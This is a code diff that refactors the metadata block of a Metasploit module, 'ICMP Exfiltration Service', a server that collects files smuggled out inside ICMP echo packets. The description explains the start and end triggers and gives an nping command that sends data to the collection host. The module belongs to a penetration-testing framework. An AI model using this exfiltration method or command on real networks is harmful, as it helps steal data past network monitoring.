@@ -12,34 +12,37 @@ class Metasploit3 < Msf::Auxiliary
   include Msf::Exploit::Remote::Capture
   include Msf::Auxiliary::Report
 
-  def initialize
+  def initialize(info={})
     super(
-      'Name'         => 'ICMP Exfiltration Service',
-      'Description'  => %q{
-        This module is designed to provide a server-side component to receive and store files
-        exfiltrated over ICMP echo request packets.
+        update_info(
+            info,
+            'Name'         => 'ICMP Exfiltration Service',
+            'Description'  => %q{
+              This module is designed to provide a server-side component to receive and store files
+              exfiltrated over ICMP echo request packets.
 
-        To use this module you will need to send an initial ICMP echo request containing the
-        specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or
-        a random filename can be assisnged). All data received from this source will automatically
-        be added to the receive buffer until an ICMP echo request containing a specific end trigger
-        (defaults to '^EOL') is received.
+              To use this module you will need to send an initial ICMP echo request containing the
+              specific start trigger (defaults to '^BOF') this can be followed by the filename being sent (or
+              a random filename can be assisnged). All data received from this source will automatically
+              be added to the receive buffer until an ICMP echo request containing a specific end trigger
+              (defaults to '^EOL') is received.
 
-        Suggested Client:
-        Data can be sent from the client using a variety of tools. One such example is nping (included
-        with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string "BOFtest.txt" -c1
-      },
-      'Author'      => 'Chris John Riley',
-      'License'     => MSF_LICENSE,
-      'References'  =>
-        [
-          # packetfu
-          ['URL','https://github.com/todb/packetfu'],
-          # nping
-          ['URL', 'http://nmap.org/book/nping-man.html'],
-          # simple icmp
-          ['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
-        ]
+              Suggested Client:
+              Data can be sent from the client using a variety of tools. One such example is nping (included
+              with the NMAP suite of tools) - usage: nping --icmp 10.0.0.1 --data-string "BOFtest.txt" -c1
+            },
+            'Author'      => 'Chris John Riley',
+            'License'     => MSF_LICENSE,
+            'References'  =>
+                [
+                    # packetfu
+                    ['URL','https://github.com/todb/packetfu'],
+                    # nping
+                    ['URL', 'http://nmap.org/book/nping-man.html'],
+                    # simple icmp
+                    ['URL', 'http://blog.c22.cc/2012/02/17/quick-post-fun-with-python-ctypes-simpleicmp/']
+                ]
+        )
     )
 
     register_options([
